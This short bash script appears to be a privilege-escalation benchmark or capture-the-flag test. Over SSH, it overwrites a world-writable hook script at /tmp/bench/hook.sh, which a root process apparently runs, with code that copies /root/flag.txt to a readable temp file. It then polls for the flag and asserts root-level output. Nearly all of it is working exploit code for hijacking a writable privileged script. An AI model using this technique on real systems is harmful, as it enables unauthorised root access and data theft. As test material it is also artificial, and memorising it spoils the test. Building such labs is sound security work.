#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/tmp_flag
cat > /tmp/bench/hook.sh <<'"'"'EOF'"'"'
#!/bin/sh
cat /root/flag.txt > /tmp/tmp_flag
chmod 666 /tmp/tmp_flag
EOF
chmod 777 /tmp/bench/hook.sh
for i in $(seq 1 45); do
  if test -r /tmp/tmp_flag && grep -q FLAG /tmp/tmp_flag 2>/dev/null; then
    cat /tmp/tmp_flag
    exit 0
  fi
  sleep 1
done
echo "timeout waiting for tmp hook" >&2
exit 1
')"
assert_root_output "${out}"
